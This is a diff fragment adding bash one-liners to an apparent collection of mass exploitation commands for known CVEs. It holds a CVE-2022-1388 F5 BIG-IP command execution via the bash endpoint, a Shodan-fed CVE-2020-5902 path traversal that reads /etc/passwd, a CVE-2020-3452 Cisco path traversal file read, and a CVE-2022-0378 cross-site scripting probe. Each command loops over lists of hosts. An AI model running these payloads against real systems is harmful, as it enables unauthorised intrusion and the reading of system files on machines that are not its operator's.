@@ -5,3 +5,12 @@ cat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H "X-
 
 # Exploit F5 Big IP  Using Curl - CVE-2022-1388  
 cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" http://$ip/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}';done
+
+# CVE-2020-5902
+shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
+
+# CVE-2020-3452
+while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
+
+# CVE-2022-0378
+cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
